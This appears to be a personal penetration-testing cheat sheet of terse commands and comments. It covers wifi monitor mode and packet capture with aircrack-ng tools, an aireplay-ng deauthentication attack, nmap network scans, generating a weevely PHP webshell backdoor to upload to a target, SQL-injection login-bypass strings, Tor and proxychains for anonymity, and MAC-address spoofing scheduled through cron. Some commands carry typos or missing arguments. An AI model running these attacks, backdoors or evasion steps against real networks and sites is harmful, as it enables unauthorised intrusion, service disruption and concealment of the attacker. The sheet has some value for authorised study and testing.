# WIFI_Penetration_testing
airmon-ng  # show the internet interface
airmon-ng start wlan0
# this will create a new wifi interface in the network 
# check with ifconfig ( generally wlan0mon)
airmon-ng start wlan0mon # diff option stop | check 

airodump-ng wlan0mon # will display all router informations
# select mac address of target router
# to monitor packets in specific router 
# -c is for channel --bssid braodcast id MAC address -w write file address


airodump-ng -c 4 --bssid - w file_location_to_save

# 10 is deauthorization  -a router_mac address -c client_mac from early step
#aireplay-ng -0 10 -a mac_add_mon0_wlan -c mac_address  wlan0mon


# nmap port scanner
nmap -A ip_address
nmap -A 192.168.0.1/24 # all Network




# ipcalc software show ip info details
# sudo apt install ipcalc

Back door
# weevely generate password(123456 any) where_in_your_machine(/root/shell.php) # back door shell 
1. Generate Back door file (php ) # weevly generate 
# upload in target 
https://securityonline.info/weevely-tutorial-php-webshell/



## SQL Injection
select * from accounts where username = "username" and password = "password' and 1 = 1 #'

select * from accounts where usename = 'admin' and password='aaa' or 1 = 1 # Condition True

User injecting
select * from accounts where username = 'admin' # ' and password = $PASSWORD
comment all after userid --> admin'#

#################################################################
TOR
service tor status
service tor daemon
proxychains firefox www.duckduckgo.com
  

nano /etc/NetworkManager/NetworkManager.conf
service network-manager restart

####### macchanger to change mac id
machchanger --help
macchanger -ls # list all mac address
## help

  -h,  --help                   Print this help
  -V,  --version                Print version and exit
  -s,  --show                   Print the MAC address and exit
  -e,  --ending                 Don't change the vendor bytes
  -a,  --another                Set random vendor MAC of the same kind
  -A                            Set random vendor MAC of any kind
  -p,  --permanent              Reset to original, permanent hardware MAC
  -r,  --random                 Set fully random MAC
  -l,  --list[=keyword]         Print known vendors
  -b,  --bia                    Pretend to be a burned-in-address
  -m,  --mac=XX:XX:XX:XX:XX:XX
       --mac XX:XX:XX:XX:XX:XX  Set the MAC XX:XX:XX:XX:XX:XX

mac

# automatically change mac address  
# daily job after reboot
crontab -e




